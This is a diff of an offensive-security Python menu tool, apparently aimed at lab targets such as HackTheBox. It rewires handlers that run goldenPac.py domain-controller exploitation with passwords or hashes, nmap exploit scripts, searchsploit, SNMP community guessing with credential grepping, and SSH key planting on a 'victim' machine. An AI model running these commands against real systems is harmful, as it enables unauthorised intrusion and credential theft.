@@ -463,12 +463,13 @@ def fileCheck(variable):
             print("[+] Adding username Administrator to " + variable + "...")
             localCOM("echo 'Administrator' > " + variable)
             print("[+] Adding password Admin to " + variable + "...")
-            localCOM("echo 'Admin' > " + variable)
+            localCOM("echo 'Admin' > " + variable)            
             
-      for x in range (0, maxUser):
-         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-         USER[x] = spacePadding(USER[x], COL3)         
-      wipeTokens(VALD)
+      if variable == dataDir + "/usernames.txt":
+         for x in range (0, maxUser):
+            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+            USER[x] = spacePadding(USER[x], COL3)         
+         wipeTokens(VALD)
    else:
       print("[+] Checked file " + variable + ", the file contains data...")
    return
@@ -715,25 +716,25 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) FILE Editor (78) Hail HYDRA (89) FTP      " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) GoldenDCPAC (67) VulnScanner (78)", end = ' ')
 
-   print('\u2551' + "(02) Re/Set IP  ADDRESS (13) Start WEB Server (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Blood Hound (68)", end= ' ')
-   
    if proxyChains == 1:
       print(colored(menuName,colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName, end= ' ')
-   print("(79) RESERVED   (90) SSH      " + '\u2551')
-     
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) BH ACL PAWN (69) SNMP Walker (80) VulnFinder (91) SSHKeyID " + '\u2551')   
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) SecretsDump (70) GenSSHKeyID (81)            (92) Telnet   " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) CrackMapExe (71) GenListUser (82)            (93) Netcat   " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListPass (83)            (94) SQSH     " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) SmbExecHASH (73) GenPhishCod (84)            (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) WmiExecHASH (74) AutoPhisher (85)            (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) DIR Searchs (86) MSFCon TOM (97) WinRm    " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Nikto Scans (87) MSFCon OWA (98) RemDesk  " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE  NAME (22) SubDOMAINS/VHOST (33) NFSMount (44) SmbMount SHARE (55) Golden DC PAC (66) KBR5 Ticket (77) NTDSDECRYPT (88) MSFCon RCE (99) Exit     " + '\u2551')
+
+   print("(89) FTP     " + '\u2551')
+
+   print('\u2551' + "(02) Re/Set IP  ADDRESS (13) Start WEB Server (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Domain Dump (68) ExplScanner (79)             (90) SSH     " + '\u2551')     
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) Blood Hound (69) Expl Search (80) GenSSHKeyID (91) SSHKeyID" + '\u2551')   
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) BH ACL PAWN (70) FILE Editor (81)             (92) Telnet  " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) SecretsDump (71) GenListUser (82)             (93) Netcat  " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) CrackMapExe (72) GenListPass (83)             (94) SQSH    " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) PSExec HASH (73) ManPhishCod (84) SNMP Walker (95) MSSQL   " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) SmbExecHASH (74) AutoPhisher (85) Hail  Hydra (96) MySQL   " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Kerbe5 Ticket (64) WniExecHASH (75) DIR Searchs (86) MSFCon  TOM (97) WinRm   " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Silver Ticket (65) Remote Sync (76) Nikto Scans (87) MSFCon  OWA (98) RemDesk " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE  NAME (22) SubDOMAINS/VHOST (33) NFSMount (44) SmbMount SHARE (55) Golden Ticket (66) RSync Dumps (77) NTDSDECRYPT (88) MSFCon  RCE (99) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -2694,6 +2695,40 @@ while True:
          else:
             print("[+] TGT was not generated...")                              
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - kinit j.nakazawa@REALCORP.HTB.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='53':
+      checkParams = test_TIP()
+
+      if checkParams != 1:
+         checkParams = test_DOM()
+
+      if checkParams != 1:
+         checkParams = test_USR()
+
+      if checkParams != 1:
+         krb5 = input("[?] Please enter default realm :")
+         print(colored("[*] Attempting to create kerberus ticket for user " + USR.rstrip(" ") + "@" + krb5.rstrip("\n") + "...", colour3))
+         localCOM("mv /etc/krb5.conf /etc/krb5.conf.bak")
+         localCOM("echo '[libdefaults]' > /etc/krb5.conf")
+         localCOM("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
+         localCOM("echo '[realms]' >> /etc/krb5.conf")
+         localCOM("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
+         localCOM("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
+         localCOM("echo '\t\t\t}' >> /etc/krb5.conf\n")
+         localCOM("kinit " + USR.rstrip(" "))
+         localCOM("klist")
+         localCOM("rm /etc/krb5.conf")
+         localCOM("mv /etc/krb5.conf.bak /etc/krb5.conf")
+
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2704,7 +2739,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '53':
+   if selection == '54':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -2736,7 +2771,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '54':
+   if selection == '55':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -2758,34 +2793,12 @@ while True:
          else:
             print("[+] Golden TGT was not generated...")            
       prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='55':
-      checkParams = test_TIP()
       
-      if checkParams != 1:
-         checkParams = test_DOM()      
-         
-      if checkParams != 1:
-         if NTM[:5] != "EMPTY":
-            print("[i] Using HASH value as password credential...")
-            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
-         else:
-            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
-      prompt()      
-
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
+# Details : Menu option selected - ldapdomaindump
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2809,11 +2822,33 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
+# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
+      checkParams = test_TIP()
+      
+      if checkParams != 1:
+         checkParams = test_DOM()      
+         
+      if checkParams != 1:
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
+         else:
+            remotCOM(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
+      prompt()      
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='58':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -2841,7 +2876,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='58':
+   if selection =='59':
       checkParams != test_TIP()
       
       if checkParams != 1:
@@ -2865,7 +2900,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':
+   if selection =='60':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -2932,7 +2967,7 @@ while True:
 # Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
 # -------------------------------------------------------------------------------------
 
-   if selection =='60':
+   if selection =='61':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -3007,7 +3042,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='62':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -3026,7 +3061,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='63':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -3045,7 +3080,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='64':
       checkParams = test_TIP()
       
       if checkParams != 1:
@@ -3064,7 +3099,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='64':
+   if selection =='65':
       checkParams = test_TIP()     
        
       if checkParams != 1:
@@ -3085,7 +3120,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='65':
+   if selection =='66':
       checkParams = test_TIP()       
       
       if checkParams != 1:
@@ -3094,39 +3129,51 @@ while True:
       if checkParams != 1:
          remotCOM("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")   
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - nmap vuln
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='67':
+      remotCOM("nmap --script vuln " + TIP.rstrip(" ") + " --reason")
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - nmap exploit
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='68':
+      remotCOM("nmap --script exploit " + TIP.rstrip(" ") + " --reason")
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - kinit j.nakazawa@REALCORP.HTB.
+# Details : Menu option selected - Searchsploit service
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='66':
-      checkParams = test_TIP()
-
-      if checkParams != 1:
-         checkParams = test_DOM()
-
-      if checkParams != 1:
-         checkParams = test_USR()
-
-      if checkParams != 1:
-         krb5 = input("[?] Please enter default realm :")
-         print(colored("[*] Attempting to create kerberus ticket for user " + USR.rstrip(" ") + "@" + krb5.rstrip("\n") + "...", colour3))
-         localCOM("mv /etc/krb5.conf /etc/krb5.conf.bak")
-         localCOM("echo '[libdefaults]' > /etc/krb5.conf")
-         localCOM("echo '	default_realm = " + krb5.rstrip("\n") + "' >> /etc/krb5.conf")
-         localCOM("echo '[realms]' >> /etc/krb5.conf")
-         localCOM("echo '\t\t" + krb5.rstrip("\n") + " = {' >> /etc/krb5.conf")
-         localCOM("echo '\t\t\tkdc = " + TIP.rstrip(" ") + "' >> /etc/krb5.conf")
-         localCOM("echo '\t\t\t}' >> /etc/krb5.conf\n")
-         localCOM("kinit " + USR.rstrip(" "))
-         localCOM("klist")
-         localCOM("rm /etc/krb5.conf")
-         localCOM("mv /etc/krb5.conf.bak /etc/krb5.conf")
-
+   if selection == '69':
+      services = input("[?] Please enter service name: ")
+      localCOM("searchsploit '" + services + "' > sploit.tmp")      
+      nullTest = linecache.getline("sploit.tmp",1)      
+      if "Exploits: No Results" in nullTest:
+         print("[-] No exploits were found for service " + services + "...")
+         nullTest = linecache.getline("sploit.tmp",2)
+         if "Shellcodes: No Results" in nullTest:
+            print("[-] No shellcodes were found for service " + services + "...")         
+      else:
+         print("[+] Exploits found...")
+         catsFile("sploit.tmp") 
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3137,7 +3184,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='67':
+   if selection =='70':
       print("[!] (1) USER NAMES (2) PASS WORDS (3) NTLM HASHES (4) HOSTS CONFIG (5) RESOLV CONFIG (6) PROXYCHAINS CONFIG (7) KERB5 CONFIG")
       
       checkParams = 0
@@ -3183,100 +3230,6 @@ while True:
 
       if checkParams == 0:
          print("[-] Sorry, I do not understand the value " + subChoice + "...")    
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - ProxyChains switch on/off
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='68':
-      if proxyChains == 0:
-         proxyChains = 1
-         print("[+] Proxychains activated...")
-      else:
-         proxyChains = 0
-         print("[-] Proxychains de-activated...")
-      prompt()
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - SNMP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='69':
-      print(colored("[*] Checking all communities...", colour3))
-      localCOM("echo 'public' > community.tmp")
-      localCOM("echo 'private' >> community.tmp")
-      localCOM("echo 'manager' >> community.tmp")
-      remotCOM("onesixtyone -c community.tmp " + TIP.rstrip(" ") + " > 161.tmp") 
-      catsFile("161.tmp")
-      
-      print(colored("[*] Enumerating public v2c communities only...", colour3))
-      
-      print("[+] Checking system processes...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking running processes...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking running systems...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking storage units...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking software names...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking user accounts...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Checking local ports...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
-      catsFile("walk.tmp")
-      
-      print("[+] Enumerating the entire MIB tree, please wait this may take sometime...")
-      remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walk.tmp")    
-      print("[+] Interesting finds...")
-      localCOM("grep password walk.tmp > find.tmp")
-      localCOM("grep user walk.tmp >> find.tmp")
-      catsFile("find.tmp")
-      
-      print("[+] Enumeration file temporary saved as walk.tmp for manual perusal...")
-      
-      prompt()      
-            
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - SSH GEN GENERATION
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='70':
-      print(colored("[*] Generating Keys...\n", colour3))
-      localCOM("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
-      catsFile("id_rsa.pub")
-      print("[+] Now insert the above into authorized_registryKeys on the victim's machine...")      
-      
-      if USR[:2] == "''":
-         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
-      else:
-         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3598,13 +3551,18 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Hail Hydra
+# Details : Menu option selected - Proxychain ON/OFF
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='78':
-      print("\nA NEW HYDRA INTERFACE IS BEING DEVELOPED.")
-      prompt() 
+   if selection =='78':        
+      if proxyChains == 0:
+         proxyChains = 1
+         print("[+] Proxychains activated...")
+      else:
+         proxyChains = 0
+         print("[-] Proxychains de-activated...")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3621,34 +3579,32 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - SSH KEY GEN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '80':
-      services = input("[?] Please enter service name: ")
-      localCOM("searchsploit '" + services + "' > sploit.tmp")      
-      nullTest = linecache.getline("sploit.tmp",1)      
-      if "Exploits: No Results" in nullTest:
-         print("[-] No exploits were found for service " + services + "...")
-         nullTest = linecache.getline("sploit.tmp",2)
-         if "Shellcodes: No Results" in nullTest:
-            print("[-] No shellcodes were found for service " + services + "...")         
+   if selection =='80':
+      print(colored("[*] Generating Keys...\n", colour3))
+      localCOM("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
+      catsFile("id_rsa.pub")
+      print("[+] Now insert the above into authorized_registryKeys on the victim's machine...")      
+      
+      if USR[:2] == "''":
+         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
       else:
-         print("[+] Exploits found...")
-         catsFile("sploit.tmp")         
+         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected -
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='81':
-      prompt()
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3659,8 +3615,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='82':
-      prompt() 
-
+      prompt()
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -3671,27 +3627,76 @@ while True:
 
    if selection =='83':
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - SNMP Walker
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='84':
+      checkParams = test_PRT("161")      
+      if checkParams != 1:
+         print(colored("[*] Checking all communities...", colour3))
+         localCOM("echo 'public' > community.tmp")
+         localCOM("echo 'private' >> community.tmp")
+         localCOM("echo 'manager' >> community.tmp")
+         remotCOM("onesixtyone -c community.tmp " + TIP.rstrip(" ") + " > 161.tmp") 
+         catsFile("161.tmp")
+      
+         print(colored("[*] Enumerating public v2c communities only...", colour3))
+      
+         print("[+] Checking system processes...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking running processes...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking running systems...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking storage units...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking software names...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking user accounts...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Checking local ports...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
+         catsFile("walk.tmp")
+      
+         print("[+] Enumerating the entire MIB tree, please wait this may take sometime...")
+         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walk.tmp")    
+         print("[+] Interesting finds...")
+         localCOM("grep password walk.tmp > find.tmp")
+         localCOM("grep user walk.tmp >> find.tmp")
+         catsFile("find.tmp")
+      
+         print("[+] Enumeration file temporary saved as walk.tmp for manual perusal...")
+            
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - Hail Hydra
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
+      print("\nA NEW HYDRA INTERFACE IS BEING DEVELOPED.")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
